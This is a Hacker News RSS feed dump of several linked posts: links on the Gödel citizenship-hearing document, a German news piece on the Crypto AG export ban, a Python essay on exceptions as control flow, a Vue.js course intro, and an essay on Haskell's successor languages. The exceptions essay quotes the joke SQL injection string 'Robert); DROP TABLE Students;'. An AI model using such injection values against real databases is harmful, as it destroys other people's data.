        <a href="https://drive.google.com/file/d/0B9_mR_M2zOc4Y2VhNzZkMDQtMDdlNC00YWQ0LWJlYzQtMzAxZjAxMGYxNzM5/view?usp=sharing">
          PDF of original Morgenstern document on the Gödel citizenship hearing</a>:
        Morgenstern says that he did not check dates, and that corrected ones would be needed.
        The dates are, indeed, wrong.
        The ones above are from Dawson and presumably correct.
        The "Examinor" (sic) referred to is Judge Forman.
        Morgenstern was not a native English speaker, and this often shows in his wording and spelling.
      </li>
      <li>
        <a href="http://www.ias.edu/people/godel/institute">
          The Institute for Advanced Studies Web page</a>
        on which I first saw an edited version the Lost Morgenstern Document.
      </li>
      <li><a href="http://www.ias.edu/files/pdfs/publications/letter-2006-spring.pdf">The IAS "Letter" for Spring 2006,
          in which the Lost Morgenstern Document first reappeared</a>.
      </li>
      <li>
        <a href="http://jeffreykegler.blogspot.com/2008/11/kurt-gdel-contradiction-in-us.html">
          The first article in my blog series on the finding of the Lost Morgenstern Document</a>,
        and what I think it reveals.
      </li>
      <li><a href="http://jeffreykegler.github.io/personal/">My personal website</a>
        has more about me (Jeffrey Kegler) and my other interests.
      </li>
      <li>I wrote a novel about Gödel's "ontological proof" of the existence of God.
        The God Proof is available as
        <a href="https://drive.google.com/open?id=0B9_mR_M2zOc4WVJFNWJXNkJfSHc">
          as a free download</a>.
        You can also order
        <a href="http://www.amazon.com/God-Proof-Jeffrey-Kegler/dp/1434807355">
          print copies from Amazon.com</a>.
      </li>
    </ul>
    
    <p>These pages are licensed under a
      <a href="https://creativecommons.org/licenses/by-nd/4.0/">Creative
        Commons Attribution-NoDerivatives 4.0 International
        License</a>
    </p>
    
    
    
    

</div>]]>
            </description>
            <link>https://jeffreykegler.github.io/personal/morgenstern.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552825</guid>
            <pubDate>Tue, 22 Sep 2020 10:19:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crypto AG scandal leads to diplomatic discordancy between Sweden and Switzerland]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552740">thread link</a>) | @draugadrotten
<br/>
September 22, 2020 | https://www.blick.ch/politik/eklat-wegen-cryptoleaks-schweden-sagt-feier-mit-cassis-ab-id16102217.html | <a href="https://web.archive.org/web/*/https://www.blick.ch/politik/eklat-wegen-cryptoleaks-schweden-sagt-feier-mit-cassis-ab-id16102217.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><ul><li><div><div><div><div><p>AFP</p><div><picture><source media="(min-width: 994px)" data-srcset="https://img.blick.ch/incoming/15574179-v7-cassis-pilatus1-afp-1k93du.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=3206&amp;height=2667" draggable="false"><source media="(min-width: 768px) and (max-width: 993px)" data-srcset="https://img.blick.ch/incoming/15574179-v7-cassis-pilatus1-afp-1k93du.jpg?imwidth=750&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=3206&amp;height=2667" draggable="false"><source media="(max-width: 767px)" data-srcset="https://img.blick.ch/incoming/15574179-v7-cassis-pilatus1-afp-1k93du.jpg?imwidth=375&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=3206&amp;height=2667" draggable="false"><img alt="Aussenminister Cassis kriegt gerade den Zorn der Schweden zu spÃ¼ren." data-srcset="https://img.blick.ch/incoming/15574179-v7-cassis-pilatus1-afp-1k93du.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=3206&amp;height=2667" src="https://img.blick.ch/incoming/15574179-v7-cassis-pilatus1-afp-1k93du.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=3206&amp;height=2667"></picture></div></div></div><div><p><i></i><span>1/7</span></p><div><p>Aussenminister Cassis kriegt gerade den Zorn der Schweden zu spÃ¼ren.</p></div></div></div></div></li><li><div><div><div><div><p>Getty Images</p><div><picture><source media="(min-width: 994px)" data-srcset="https://img.blick.ch/incoming/16101430-v0-schweden1-gettyimages-1198600981.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=2835&amp;height=1890" draggable="false"><source media="(min-width: 768px) and (max-width: 993px)" data-srcset="https://img.blick.ch/incoming/16101430-v0-schweden1-gettyimages-1198600981.jpg?imwidth=750&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=2835&amp;height=1890" draggable="false"><source media="(max-width: 767px)" data-srcset="https://img.blick.ch/incoming/16101430-v0-schweden1-gettyimages-1198600981.jpg?imwidth=375&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=2835&amp;height=1890" draggable="false"><img alt="Schwedens Aussenministerin Ann Linde ist nicht gut auf die Schweiz zu sprechen." data-srcset="https://img.blick.ch/incoming/16101430-v0-schweden1-gettyimages-1198600981.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=2835&amp;height=1890" src="https://img.blick.ch/incoming/16101430-v0-schweden1-gettyimages-1198600981.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=2835&amp;height=1890"></picture></div></div></div><div><p><i></i><span>2/7</span></p><div><p>Schwedens Aussenministerin Ann Linde ist nicht gut auf die Schweiz zu sprechen.</p></div></div></div></div></li><li><div><div><div><div><p>Keystone</p><div><picture><source media="(min-width: 994px)" data-srcset="https://img.blick.ch/incoming/16101431-v0-crypto-highres1-407919553-highres.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=4660&amp;height=3106" draggable="false"><source media="(min-width: 768px) and (max-width: 993px)" data-srcset="https://img.blick.ch/incoming/16101431-v0-crypto-highres1-407919553-highres.jpg?imwidth=750&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=4660&amp;height=3106" draggable="false"><source media="(max-width: 767px)" data-srcset="https://img.blick.ch/incoming/16101431-v0-crypto-highres1-407919553-highres.jpg?imwidth=375&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=4660&amp;height=3106" draggable="false"><img alt="Die Nachfolgefirma der Crypto AG, die CryptoÂ&nbsp;International AG, zerbrach am Exportverbot des Bundesrats." data-srcset="https://img.blick.ch/incoming/16101431-v0-crypto-highres1-407919553-highres.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=4660&amp;height=3106" src="https://img.blick.ch/incoming/16101431-v0-crypto-highres1-407919553-highres.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=4660&amp;height=3106"></picture></div></div></div><div><p><i></i><span>3/7</span></p><div><p>Die Nachfolgefirma der Crypto AG, die CryptoÂ&nbsp;International AG, zerbrach am Exportverbot des Bundesrats.</p></div></div></div></div></li><li></li><li></li><li></li><li><div><div><div><div><p>KARL-HEINZ HUG</p><div><picture><source media="(min-width: 994px)" data-srcset="https://img.blick.ch/incoming/16101433-v0-cassis1.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=476&amp;height=305" draggable="false"><source media="(min-width: 768px) and (max-width: 993px)" data-srcset="https://img.blick.ch/incoming/16101433-v0-cassis1.jpg?imwidth=750&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=476&amp;height=305" draggable="false"><source media="(max-width: 767px)" data-srcset="https://img.blick.ch/incoming/16101433-v0-cassis1.jpg?imwidth=375&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=476&amp;height=305" draggable="false"><img alt="Seit 2017 fÃ¼hrt Cassis das Aussendepartement." data-srcset="https://img.blick.ch/incoming/16101433-v0-cassis1.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=476&amp;height=305" src="https://img.blick.ch/incoming/16101433-v0-cassis1.jpg?imwidth=1000&amp;ratio=FREE&amp;x=0&amp;y=0&amp;width=476&amp;height=305"></picture></div></div></div><div><p><i></i><span>7/7</span></p><div><p>Seit 2017 fÃ¼hrt Cassis das Aussendepartement.</p></div></div></div></div></li></ul></div></div></div></div><p>Die politischen Beziehungen zwischen der Schweiz und Schweden sind ausÂ­gezeichnet und problemfreiÂ», heisst es auf der Internetseite des schweizerischen AussenÂ­ministeriums EDA.</p><p>Das ist ziemlich geschwurbelt. Denn zwischen den beiden Staaten herrscht gerade dicke Luft.</p><p>Am 15. Oktober hÃ¤tte in Stockholm ein feierliches Dinner stattfinden sollen. Zu den hochkarÃ¤tigen GÃ¤sten hÃ¤tten Bundesrat Ignazio Cassis (59) und seine schwedische Amtskollegin Ann Linde (58) gehÃ¶rt. Â­Anlass ist das 100-Jahr-Â­JubilÃ¤um der diplomatischen Â­Beziehungen zwischen der Eidgenossenschaft und dem KÃ¶nigreich; die Schweiz hat seit 1920 in Stockholm eine Â­eigene Gesandtschaft.</p><p>Doch daraus wird nichts. Das schwedische Aussenministerium hat den Termin diese Woche Â­platzen lassen. Eine befreundete Regierung derart vor den Kopf zu stossen, ist ein hÃ¶chst unÃ¼bÂ­liches ManÃ¶ver.</p><p>Den Grund fÃ¼r den diplomaÂ­tischen Eklat lieferte Ann Lindes Ministerium gleich mit: Die AbÂ­sage an Cassis wird explizit mit dem Verweis auf einen Entscheid des Bundesrats in der Crypto-Â­ AffÃ¤re begrÃ¼ndet, wie gut informierte Quellen gegenÃ¼ber SonntagsBlick Â­berichten.</p><p><h3>Tradition der NeutralitÃ¤tspolitik</h3></p><p>Im Juni hatte die LandesÂ­regierung entschieden, dass die Firma Crypto International AG im zugerischen Steinhausen keine ChiffriergerÃ¤te mehr exportieren darf. Der Beschluss besiegelt das Ende des Unternehmens, das durch seine neuen EigentÃ¼mer in schwedischer Hand ist. 80 Mitarbeiter werden auf die Strasse gestellt.</p><p>Das ist aber nur einer der GrÃ¼nde fÃ¼r den Zorn aus dem Norden â€“ vor allem kÃ¶nnen die Skandinavier nun keine Cyber-Security-Software mehr beziehen. Obwohl doch das Land wie die Schweiz eine Tradition der NeutralitÃ¤tspolitik und der Guten Dienste kennt.</p><p>Der Entscheid des Bundesrats fiel vor dem Hintergrund der sogenannten Cryptoleaks-AffÃ¤re. SRF und Tamedia machten im Â­Februar Details dazu bekannt, wie die Firma Crypto AG in Zug wÃ¤hrend des Kalten Krieges ChiffrierÂ­gerÃ¤te in alle Welt exportiert hatte â€“ und dabei von der amerikanischen CIA und dem Bundesnachrichtendienst (BND) Ã¼berwacht wurde.</p><p>Obwohl es sich bei der Crypto International AG um ein NachÂ­folgeunternehmen handelt und die Besitzer beteuern, dass das Â­GeschÃ¤ft nichts mehr mit der Â­alten Crypto AG zu tun hat, griff der Bundesrat unter dem mediÂ­alen und politischen Druck zum ZweihÃ¤nder.</p><p><h3>Beide rÃ¼hmen sich als Friedensstifter</h3></p><p>Im EDA ist man schlecht auf Wirtschaftsminister Guy Parmelin (60) zu sprechen. Dessen Staatssekretariat fÃ¼r Wirtschaft (Seco) hat mit einer Strafanzeige gegen Unbekannt die aktuelle Â­Entwicklung erst ins Rollen gebracht und war ein Treiber des ExportÂ­verbots.</p><p>Jetzt mÃ¼ssen Bundesrat Ignazio Cassis und seine Verwaltung die Suppe auslÃ¶ffeln. Dem Vernehmen nach haben auch andere befreundete Staaten beim Aussendepartement gegen das Exportverbot protestiert.</p><p>GegenÃ¼ber SonntagsBlick hÃ¤lt man sich beim EDA mit O-TÃ¶nen zurÃ¼ck. Man bestÃ¤tigt aber die Â­Recherchen: Â«Zur Feier des Â­hundertjÃ¤hrigen Bestehens der diplomatischen Beziehungen zwischen der Schweiz und Schweden war auch ein Treffen auf Aussenministerebene vorÂ­gesehen. Dieses Treffen wird gemÃ¤ss heutigem Kenntnisstand nicht stattfinden.Â»</p><p>Nun gilt es, das Kriegsbeil zu begraben. Eine Gemeinsamkeit der zwei LÃ¤nder sollte Hoffnung machen: Beide rÃ¼hmen sich als Friedensstifter in internatioÂ­nalen Konflikten.</p></div><div><div title="Publiziert: 19.09.2020, 23:36 Uhr"><p>Publiziert: 19.09.2020, 23:36 Uhr</p></div><div title="Zuletzt aktualisiert: 19.09.2020, 23:50 Uhr"><p>Zuletzt aktualisiert: 19.09.2020, 23:50 Uhr</p></div></div></div>]]>
            </description>
            <link>https://www.blick.ch/politik/eklat-wegen-cryptoleaks-schweden-sagt-feier-mit-cassis-ab-id16102217.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552740</guid>
            <pubDate>Tue, 22 Sep 2020 10:01:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exceptions as Control Flow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552696">thread link</a>) | @george3d6
<br/>
September 22, 2020 | https://blog.cerebralab.com/Exceptions_as_control_flow | <a href="https://web.archive.org/web/*/https://blog.cerebralab.com/Exceptions_as_control_flow">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
        <p>Published on: 2020-09-22</p>
        
<p>What do I mean by using exceptions as a control flow mechanism?</p>
<h2>I - Exceptions as control flow mechanism</h2>
<p>The gist of it is replacing something like:</p>
<pre><code>if isinstance(a, duck):
    a.quack()
else:
    bar()
</code></pre>
<p>With something like:</p>
<pre><code>try:
    a.quack()
except:
    bar()
</code></pre>
<p>Writing control flows using an if/switch/etc involves thinking about something like:</p>
<blockquote>
<p>Unde what conditions should I perform this operation and what should I do if those conditions aren't true?</p>
</blockquote>
<p>Writing control flows using exception switched that paradigm to:</p>
<blockquote>
<p>If this operation fails, what should I try instead?</p>
</blockquote>
<hr>
<p>An example that I encountered in the real world:</p>
<p>As part of a data cleaning script, I had to determine if a float different from <code>NaN</code> in python. But really, what I wanted to ask was: "Can I use this variable of type float/np.float/whatever in basic numerical operations without raising exceptions or running into undefined behavior ?".</p>
<p>The obvious way to do that is something like: <code>math.isnan(number)</code>, right?</p>
<p>Well, technically correct, as long as your definition of <code>NaN</code> is the same as the one python has. But under my definition, this will fail in cases like the following: <code>np.isnan(float('inf'))</code>.</p>
<p>So I have to write a function like:</p>
<pre><code>def is_invalid_float(nr):
    if np.isnan(nr):
    	return True
    elif np.isinf(nr):
    	return True
    else:
    	return False
</code></pre>
<p>This has some disadvantages:</p>
<p>a) I have to know about the fact that a floating-point variable can be both <code>nan</code> and <code>inf</code>.</p>
<p>b) I may still be missing some edge cases in which a float typed variable can lead to UB or exception throwing in numeric operations.</p>
<p>c) It's a somewhat complex function, instead of a one-liner calling an external function.</p>
<p>The exception-based version looks something like:</p>
<pre><code>def is_invalid_float(nr):
    try:
    	int(nr)
    	return False
    except:
    	return True
</code></pre>
<p>Much better, right?</p>
<p>Well, arguably. Going through my complaints above:</p>
<p>a) I have to know about the fact that a floating-point variable can be both <code>nan</code> and <code>inf</code>. -- I don't have to know this, if I implemented my <code>nan</code> check like this to being with, I would have been safe and sound never knowing about <code>inf</code>.</p>
<p>b) I may still be missing some edge cases in which a float typed variable can lead to UB or exception throwing in numeric operations. -- Well, I might still be missing some edge cases, but there's a higher chance I won't be, since I can assume other "strange" things that may be of type <code>float</code> respect the rule 'if it's a non-numeric floating-point typed variable I can't make an integer out of it".</p>
<p>c) It's still a somewhat complex function. Shorter, but it's less obvious what kind of values (<code>nan</code> and <code>inf</code>) caused the need for this check.</p>
<p>More importantly, I'm losing potentially valid floats that can't be converted to integers for some other reasons.</p>
<p><em>Note: as far as I know there are no other "edge cases" for floating-point numbers in python other than nan and inf and any other floating-point numbers will be int-convertible on an x86 CPython RE. This is an example for illustrative purposes</em></p>
<hr>
<p>Ok, let's look at a stronger example:</p>
<p>Let's say I have a string and I need to check it's a read-only MariaDB query, something that only selects data rather than inserting, modifying, or deleting it.</p>
<p>Well, I can use an external SQL parser to tell me if the query is valid and contains mutable keywords or I can try to check for them myself, or I can:</p>
<pre><code>def is_read_only_query():
    with  new_connection() as conn:
    	try:
    		conn.execute('SET SESSION TRANSACTION READ ONLY')
    		conn.execute(query_string)
    		return True
    	except:
    		return False
</code></pre>
<p>Is this a bullet-proof solution?</p>
<p>I don't know, I wouldn't use it to prevent a SQL injection from a skilled and malicious actor. But it can avoid a <a href="https://xkcd.com/327/">"Robert); DROP TABLE Students;"</a> kind of scenario and it can certainly avoid a mistake by a clumsy database operator with the best of intentions but a habit of too readily copy-pasting stuff from stack overflow.</p>
<hr>
<p>What I'm saying here is not revolutionary, at least not for certain languages, catching an exception is often the recommended way to check if an object can be cast to a different type in python.</p>
<p>I think where people would get a bit more itchy is when seeing something like:</p>
<pre><code>def determine_type(text):
    try:
    	sum(list(text))
    	return 'list of numbers'
    except:
    	try:
    		int(text)
    		return 'int'
    	except:
    		try:
    			float(text)
    			return 'float'
    		except:
    			return 'other'
</code></pre>
<p>To me, the above code looks like the "correct" way to check if <code>text</code> is a list of numbers, integer, float, or a string representing something else.</p>
<p>But I can understand the reluctance to use these kinds of control flows. They are really ugly in terms of brackets or indentation, so getting past 6 or 7 layers of this can get unreadable. There is no easy workaround for this in dialects that people are familiar with.</p>
<p>But, what if we keep it short and sweet? What's the disadvantage of exception-based control flow?</p>
<h2>II - Stack Overflow on why it's bad</h2>
<p>I'm curious what the answer is if I google "Exceptions as control flow". I tried a few queries, this one returned varied results which bought up good points, so I stuck with it, but this is not an exhaustive list of arguments against the practice.</p>
<p>First, let's look at some of the most upvoted answers (in order of votes) on <a href="https://stackoverflow.com/questions/729379/why-not-use-exceptions-as-regular-flow-of-control">the Stack Overflow question on</a> the subject:</p>
<blockquote>
<p>Have you ever tried to debug a program raising five exceptions per second in the normal course of operation ?</p>
</blockquote>
<blockquote>
<p>I have.</p>
</blockquote>
<blockquote>
<p>The program was quite complex (it was a distributed calculation server), and a slight modification at one side of the program could easily break something in a completely different place.</p>
</blockquote>
<blockquote>
<p>I wish I could just have launched the program and wait for exceptions to occur, but there were around 200 exceptions during the start-up <em>in the normal course of operations</em></p>
</blockquote>
<blockquote>
<p>My point: <strong>if you use exceptions for normal situations, how do you locate unusual (ie _exception_al) situations?</strong></p>
</blockquote>
<blockquote>
<p>Of course, there are other strong reasons not to use exceptions too much, especially performance-wise</p>
</blockquote>
<p>I think the performance bit is very niche, in code that gets execute thousands of times per second in a high-performance application it matters. But "programming" becomes very different when focusing on performance (e.g. we might write logic that looks counter-intuitive to us but results in fewer cache misses), and for 99% of code, this doesn't matter.</p>
<p>Granted, there's some language in which exceptions are really (and I mean *** really) slow, but others, such as Python, have fairly efficient exceptions so performance shouldn't be an issue for any program that should have been written in Python to being with.</p>
<p>The first point the commenter brings up sounds much more persuasive. Namely that exceptions, even when caught, are something one should care about.</p>
<p>I.e. my code might throw an exception during runtime and I'll catch it and try to handle the situation and move forward as best I can, but I need to see those exceptions when debugging.</p>
<p>This is a valid argument but there are two ways we can deal with this:</p>
<p>a) Add some code to indicate a specific <code>catch</code> is not meant to occur</p>
<p>b) Have specific exceptions for situations that should not happen (i.e. an "TheFactThatThisHappenedIsBadPleasePayAttention" exception class)</p>
<p>But still, this means that you'd have to potentially redesign your codebase a bit if you wanted to use exceptions as a control flow mechanism and still make use of their power to signal potential errors without crashing the whole program to do so.</p>
<p>The second answer in that same thread is:</p>
<blockquote>
<p>Exceptions are basically non-local goto statements with all the consequences of the latter. Using exceptions for flow control violates a <a href="http://c2.com/cgi/wiki?PrincipleOfLeastAstonishment">principle of least astonishment</a>, make programs hard to read (remember that programs are written for programmers first).</p>
</blockquote>
<blockquote>
<p>Moreover, this is not what compiler vendors expect. They expect exceptions to be thrown rarely, and they usually let the throw code be quite inefficient. Throwing exceptions is one of the most expensive operations in .NET.</p>
</blockquote>
<blockquote>
<p>However, some languages (notably Python) use exceptions as flow-control constructs. For example, iterators raise a StopIteration exception if there are no further items. Even standard language constructs (such as for) rely on this.</p>
</blockquote>
<p>Again the performance argument, but at least with the added caveat that indeed in some languages this is a none issue.</p>
<p>The more interesting point is that exceptions are harder to reason about since you're not sure where they are thrown, take for example the following code:</p>
<pre><code>try:
    a()
    b()
    c()
except:
    foo()
</code></pre>
<p>When calling <code>foo</code> here we can't know why <code>foo</code> was called (i.e. was it because of a failure in <code>a</code>, <code>b</code> or <code>c</code> ?).</p>
<p>If it's non-obvious where an exception might be thrown one can simply implement multiple exception catching constructs (in the above case one for each function that is called).</p>
<p>But then again, I think this argument doesn't hold much water when we consider something like:</p>
<pre><code>if not a() or not b() or not c():
    foo()
</code></pre>
<p>Not knowing what code triggered an exception because multiple bits of it can throw is the same as not knowing what code triggered an if because multiple bits of it can set the True/False value that it evaluates.</p>
<p>This isn't a fault with exceptions, just a general issue one can introduce using any control flow mechanism.</p>
<p>Other than that, <a href="https://stackoverflow.com/users/621338/necromancer">necromancer</a> makes an interesting point in that thread, but most other arguments seem to follow the same ideas but phrased more poorly.</p>
<h2>III - Stack Exchange SE on why exceptions are bad</h2>
<p>Next, let's look at a <a href="https://softwareengineering.stackexchange.com/questions/189222/are-exceptions-as-control-flow-considered-a-serious-antipattern-if-so-why">fairly popular post on the software engineering stack exchange</a>.</p>
<p>Why are exceptions bad?</p>
<p>Well, <a href="https://softwareengineering.stackexchange.com/users/4091/blueberryfields">blueberryfields</a> makes a few arguments for why they should be considered an anti-pattern. Let's take these one by one:</p>
<blockquote>
<p>Exceptions are, in essence, sophisticated GOTO statements</p>
</blockquote>
<p>They aren't, they have stricter rules than goto statements. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.cerebralab.com/Exceptions_as_control_flow">https://blog.cerebralab.com/Exceptions_as_control_flow</a></em></p>]]>
            </description>
            <link>https://blog.cerebralab.com/Exceptions_as_control_flow</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552696</guid>
            <pubDate>Tue, 22 Sep 2020 09:54:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build a YouTube bookmarking site with Vue.js – Introduction]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552527">thread link</a>) | @codewithstein
<br/>
September 22, 2020 | https://codewithstein.com/build-a-youtube-bookmarking-site-with-vuejs-introduction/ | <a href="https://web.archive.org/web/*/https://codewithstein.com/build-a-youtube-bookmarking-site-with-vuejs-introduction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			    	
<div>
    <article itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting">
        

        <p>
            <time datetime="20-09-06">Code With Stein / Sep 06, 20 / 0 comments</time>

            /

            
                <a href="https://codewithstein.com/vuejs/">#Vue.js</a>
            
        </p>

        <hr>

        <p itemprop="description">
            "Build a YouTube bookmarking site" is a course where we'll build a site using Vue.js and Firebase. On this site we'll add authentication so users can sign up and login. When a user is authenticated he or she can add categories, and add movies into them.
        </p>

         

        <div itemprop="articleBody">
            <p>I know there are a couple of references to "Vue Hero". This is what my YouTube channel was called earlier.</p>

<p>We'll be using the brand new Vue CLI 3 to set up the project, and use Firebase Cloud Firestore for the backend to persist the data.</p>

<p><iframe width="100%" height="400" src="https://www.youtube.com/embed/-9BY-MH2zaM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
        </div>

        <hr>

        <h3>Comments</h3>

        
            <p>No comments yet...</p>
        

        <h3>Add comment</h3>

        

        
    </article>
</div>

			    </div></div>]]>
            </description>
            <link>https://codewithstein.com/build-a-youtube-bookmarking-site-with-vuejs-introduction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24552527</guid>
            <pubDate>Tue, 22 Sep 2020 09:24:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell's Children]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24552512">thread link</a>) | @psibi
<br/>
September 22, 2020 | https://owenlynch.org/posts/2020-09-16-haskells-children/ | <a href="https://web.archive.org/web/*/https://owenlynch.org/posts/2020-09-16-haskells-children/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          
          <p>
    Posted on September 16, 2020
    
</p>

<p>If I were to travel back in time 4 years ago, and tell my old self that Haskell was starting to lose its shine, I wouldn’t believe it. I grew up on Haskell, my appetite for category theory was whetted by Haskell, my biggest programming projects have been in Haskell, and my dream job was to work at a company that used Haskell.</p>
<p>But now, I find myself simply not as excited about Haskell as I used to be. What changed?</p>
<p>I think there are a couple things. I think one primary factor is that the kind of programming that Haskell really excells in; i.e.&nbsp;creating abstract, correct interfaces for things, is just not a type of programming that’s interesting to me anymore. When I wanted to work on software as a career, a language that allowed incredible facilities in not repeating yourself was very useful. Types that ensure correctness of data interchange, or lenses that allow access to complicated data structures are all very well for implementing, say, a compiler, or complicated business logic in a web backend. However, my interests in software are now primarily as a scientific/mathematical tool. Numerical algorithms can be done in Haskell, but they don’t really gain much benefit from the type system, and they also don’t have great library support.</p>
<p>No doubt Haskell could be made into the kind of language to use for the problems that I am interested in, but given the choice between working on the problems that interest me, and working on infrastructure for the problems that interest me, I would rather work on the problems that interest me. The general feeling that I have is that Haskell is a great tool for a software engineer, but I don’t want to be a software engineer, I want to be a mathematician that sometimes uses computers.</p>
<p>But there is another reason too. While I think that Haskell is still a great language, it is close to 30 years old at this point. It manages to stay fresh and relevant with an ever-growing list of extensions, and constantly changing best practices and libraries (which is itself a problem…), but it would be very sad if we as a society of programmers had failed to surpass it in any respect with any of the programming languages that have had the advantage of starting from a clean slate. In this post, I want to talk about these successor languages, and what I think about them.</p>
<h2 id="rust">Rust</h2>
<p>Surprisingly, one of Haskell’s great strengths is as a systems language. It manages to be much faster than most dynamic languages, while allowing a much higher-level interface than traditional systems languages like C (obviously). One great example of a “systems” program written in Haskell is git-annex. It is a git addition that adds tracking of large files, and was my primary backup system for a long time (I eventually decided that I didn’t need the additional power from it, and was better served by a more seamless solution).</p>
<p>However, in 2020, the premier system’s language is surely Rust. It would be unfair to compare the performance of Rust and Haskell, because Haskell is optimized for things other than performance. That being said, Rust is <em>faster</em> and <em>lower-latency</em> than Haskell, both of which are important. However, it also has a great type system, unlike C or C++ (we don’t talk about Go…). The type system in Rust is obviously very influenced by the type system of Haskell, but they also implemented “ownership” which allows for the killer feature garbage-collection free automatic memory management.</p>
<p>When I first started using Rust, I really missed monads. But here’s the thing. Having used lots of monads in Haskell, and read lots of blog posts about monads, I’ve learned that in systems contexts, it’s often best to just have a simple monad stack that just consists of Reader + IO (and Maybe’s and Option’s sprinkled about occasionally). Huge monad transformer stacks often raise more problems than they solve. But Reader + IO is <em>essentially</em> the “default monad stack” of Rust.</p>
<p>Rust also has some other killer features, like the ability to compile to webassembly (yes there is ghcjs, but, really, do you want to use ghcjs?) It also from the beginning was targetted towards industry, and consequentially has a much more vibrant ecosystem.</p>
<p>This all being said, I think it is worth looking at the features that are prominent in Haskell that ended up going to Rust</p>
<ul>
<li>Typeclasses (in Rust they are Traits)</li>
<li>Sum types (you may take this for granted, but a lot of languages don’t have them….)</li>
<li>Pervasive pattern matching</li>
<li>Hindley-Mindler type inference (automatic type inference for variables)</li>
<li>Pervasiveness of things being <em>expressions</em> rather than statements</li>
<li>Parametric Polymorphism</li>
<li>The feeling that once your program compiles, it will run</li>
</ul>
<p>I think that we should recognize Rust for what it is, a child of Haskell and the Haskell community, and like all good parents, we should want it to do better than the previous generation. In as much as Haskell is the ideas that form Haskell, the success of Rust is the success of Haskell.</p>
<h2 id="idris">Idris</h2>
<p>OK, mainstream programming languages are great, but sometimes you just want to make the perfect type-based interface to your stuff and show the imperative scrubs what a wiz-kid you are. Or alternatively, sometimes you really care that your software is correct. Or you want to concretize a new category-theory inspired design for a part of a compiler. Nowadays, the language for that is not Haskell, it is Idris.</p>
<p>There are about six different ways to sort of have dependent types in Haskell (types that depend on values, like a length-<span>n</span>) array. I don’t really fully understand any of them, and it is totally unclear to me how they work together. Presumably, there are blogs which outline the One True Way, but… it’s tough. In Idris, it just seems perfectly natural to use dependent types, like, why wouldn’t you able to have a type parameter which was a value? In many ways other than dependent types, Idris is a much cleaner language than Haskell too. And with Idris2, it has support for <em>linear types</em>, which allow mutability in a functional context via guarantees that nobody is going to try and use the old value. If I want to play around with a cool type system in a language that can also actually do things with the real world (i.e., unlike Agda or Coq), I would go to Idris rather than Haskell.</p>
<p>But Idris is undeniably Haskell’s child. The first version was written in Haskell (it is now self-hosting). They are similar in more ways than it is worth counting. Enough said.</p>
<h2 id="julia">Julia</h2>
<p>Unlike the first two, Julia doesn’t really muscle into Haskell’s territory. Scientific computing was never really Haskell’s forte, despite there being some very cool libraries written in it, like <code>ad</code> for autodifferentiation, or various array-handling packages that automatically fused consecutive array operations.</p>
<p>Also, Julia is a dynamically typed language. How could a filthy dynamically typed language ever claim to be Haskell’s child??</p>
<p>Well, for one it steals some of those cool libraries, and makes them much better! Flux is a neural networks library which essentially is just autodifferentiation + some nice utilities, and it is already competitive in my mind with TensorFlow. Julia also has StaticArrays, which integrates the size of the array into the type, and Julia has some neat fusion abilities too for making array operations really fast.</p>
<p>But wait, you ask, how can it do this if it’s not a statically typed language? Well, Julia is not your average dynamically typed language. It actually has a very interesting type system, a full discussion of which is beyond the scope of this post, and the focus on types as the unit of programming is (somewhat?) similar to Haskell (now I’m stretching it a little though).</p>
<p>The real reason I include Julia, however, is because for me personally, it has replaced Haskell as the place to do category theory. This is because of a shift of viewpoint: rather than providing a type system into which category theory can be embedded in to guide typical software engineering tasks, Julia provides a system in which <em>computations</em> in category theory can be carried out in an efficient way. Specifically, I’m talking about <a href="https://github.com/olynch/Catlab.jl">Catlab.jl</a>. A discussion of Catlab.jl is also beyond the scope of this post, but I encourage you to check it out.</p>
